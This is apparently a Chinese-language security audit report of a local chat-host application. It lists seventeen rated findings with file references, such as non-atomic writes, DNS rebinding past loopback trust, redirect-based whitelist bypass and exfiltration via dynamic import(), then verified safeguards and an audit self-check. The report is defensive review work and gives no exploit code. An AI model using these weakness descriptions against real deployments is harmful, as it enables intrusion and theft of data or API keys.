| 编号 | 严重度 | 一句话 | 位置 | 缓解工作量 |
| --- | --- | --- | --- | --- |
| F1 | **高** | 聊天 jsonl 非原子全量重写，损坏后聊天静默消失 | `chats.ts:757-761`、`sillytavern.ts:107-121`、`chats.ts:285-297` | S |
| F2 | 中 | 双宿主并发写零防护，整文件覆盖互相丢数据 | 无锁（grep 证）；`cordis.yml:59-60,76`；`DEVIATIONS.md:1033-1047` | S |
| F3 | 中 | `script.fetch` 重定向不复查、无体积上限，白名单可被 302 洗白 | `service.ts:793,3495-3519` | S |
| F4 | 中 | API key 明文落盘 connections.json | `connections.ts:51-53,412-415`；`paths.ts:275` | M |
| F5 | 中 | 无 Host 校验，DNS rebinding 打穿 loopback 信任 | `rpc-host/http.ts:5-11`、`events.ts:51-64` | S |
| F6 | 中 | JSON store 损坏静默降级 + 下次写覆盖原文；卡级 regex 策略损坏回到放行 | `settings.ts:193-226`、`connections.ts:395-409`、`scripts.ts:158-186,253-259` | S |
| F7 | 中 | backups 毫秒单调修复不覆盖双进程；`-2` 后缀字典序在保留边界先删新副本 | `backups.ts:246-259,127-131` | S |
| F8 | 中 | `script-src` 白名单常开，动态 `import()` 路径可携带数据外传 | `srcdoc.ts:165`、`policy.ts:77`、`remote.ts:31-34` | XS(文档)/S |
| F9 | 低 | 零脚本卡 greeting 内联脚本免询问执行 | `consent.ts:135-138`、`srcdoc.ts:469,738` | S |
| F10 | 低 | 缺 `base-uri`；CSP 与宿主白名单裸域漂移 | `srcdoc.ts:136-174`、`remote.ts:67` | XS |
| F11 | 低 | 同源桥放行任意同源 GET（含他卡 avatar） | `runner.ts:476-501`、`same-origin.ts:38-48` | XS |
| F12 | 低 | 快照与小文件写入非原子（快照半截可挤掉好快照；卡 PNG 原地改写半截毁卡） | `backups.ts:260` 等 §3.1 清单 | XS |
| F13 | 低 | settle 中 save 失败后 stream 通道无终态事件，前端挂生成态 | `service.ts:4018-4028` | XS |
| F14 | 低 | 损坏聊天的 open 抛原始 SyntaxError，与 list 的静默跳过互相矛盾 | `chats.ts:440-447` | XS |
| F15 | 低 | bundle 代理 GET 可被任意本地页面驱动（有界，已文档化，记录在案） | `script-cache.ts:69-83` | — |
| F16 | 低 | provider 错误回显体（≤500 字符）进入 stream.error 并原样落 cache-trace `error` 字段，理论上可能含远端拼出的凭据片段 | `iris-llm-openai-compat/src/index.ts:303-304`；`cache-trace.ts:127-133`、`service.ts:5244-5247` | XS |
| F17 | 低 | 样式重写的 `<link>` 正则在属性值含 `>` 时漏改写（方向安全：落到 CSP 拒+报告） | `srcdoc.ts:232-242` | S |

**计数：高 1（F1）；中 7（F2–F8）；低 9（F9–F17）。**

---

## 7. 复核通过项（不计发现）

- **opaque origin 隔离**：`frameSandbox` 单点产出危险组合（`policy.ts:36-43`），无 `allow-same-origin` 旁路调用点（grep 全库唯一 `setAttribute('sandbox'` 在 `runner.ts:357`）；shadow 层与安全层的关系在模块头写清并被实现遵守。
- **consent 三态**：`consentState` 对 `{scriptsAllowed: undefined}` 形态的防御（`consent.ts:63-87`）、`documentGranted` 与 `scriptsAllowed` 相反的存储约定及理由；script-policy 随删卡 `forget`，防授权被同名单新卡继承（`scripts.ts:198-206`）；预设 regex 层 default-deny（`=== true`）与卡层 default-allow 的不对称是成文裁决（a47b669）。
- **路径穿越防护**：`paths.ts:47-57,114-124`（`isSafeId` 黑名单 + `fileFor` containment 双保险）、backups 三段句柄校验（`backups.ts:433-444`）、avatar 经 `library.bytes` 库验证而非拼路径（`index.ts:421-427`）、bundle 缓存名 sha256（`script-cache.ts:235-237`）、cache-trace 的 chatId 走同一 `fileFor`（`cache-trace.ts:569-571`）。
- **cache-trace 纪律**：有界（keep=8，`DEFAULT_CACHE_TRACE_KEEP`）、独立子树且只删自己能解析的名字（`cache-trace.ts:655-670`）、原子写（`:629-631`）、写失败不抬 generation（`:616-638`）；body 不含凭据（§2.1）。明文提示词落盘为本机磁盘事实，模块自知并自述（`cache-trace.ts:18-24`）。
- **RPC 传输门**（rebinding 除外的 F5 面）：POST 强制 `application/json` 触发 preflight、从不发 ACAO、body 按线计数上限不信任 content-length（`rpc-host/http.ts:40-58`）；WS upgrade 查 Origin（`events.ts:102`）、心跳清理死连接。
- **ScriptCache**（F3 的对照组）：逐跳白名单、5 跳上限、读时不信 content-length（边读边判，`:524-529`）、写预算拒绝而非逐出（`:545-550`）、CORS `*` 只裸公开 CDN 字节且错误原因不暴露私有信息（`:584-601`）、in-flight 去重与 30 秒失败记忆（`:425-441`）。
- **中断恢复**（§4.1）、**journal 单源**（§4.3）、**双宿主事故的记录文化**（DEVIATIONS/ACTION-PLAN 如实留痕）。

---

## 8. 自查记录

- 本版（r2）把初稿的全部 file:line 引用在 `624c4ce` 上逐一重新打开核对：修正 F9（`srcdoc.ts:600-625`→`:469,738`，补 `MessageInterfaces.tsx:184` 调用点）、F13（`:4026-4036`→`:4018-4028`，并核实 `#fail` 三路径确实补发 stream.error、唯 settle catch 不发）、F16（`index.ts:316-319`→`:303-304`）、`.gitignore` 行号（:18）、F10/F11 的行号精化；r2 新增：cache-trace `error` 字段=provider 回显文本落盘（F16 扩写）、`routeCredential` 同源不比路径的语义记录（§2.3）、F12 补入 context/materialise/presets/library 五类直写点、§2.1 补 adapter key 缺失报错只名 env 变量名的证据。
- 发现计数与初稿一致（17 条，高 1 中 7 低 9）：r2 复核未发现初稿漏报的机制性缺口，所有新观察均为已有发现的证据增强。
- 未读取任何密钥明文；`data/` 下的实际数据文件一律未打开（connections.json 仅确认路径与代码中的写入形状，形状由 `tests/connections.test.ts` 的临时目录测试佐证）。
- 未发起任何真实 LLM/CDN 请求；未按进程名/端口杀进程；未改 packages/ 或 apps/ 的任何源码、未动 git。全部结论来自代码、注释内的实测记录与 tests/。
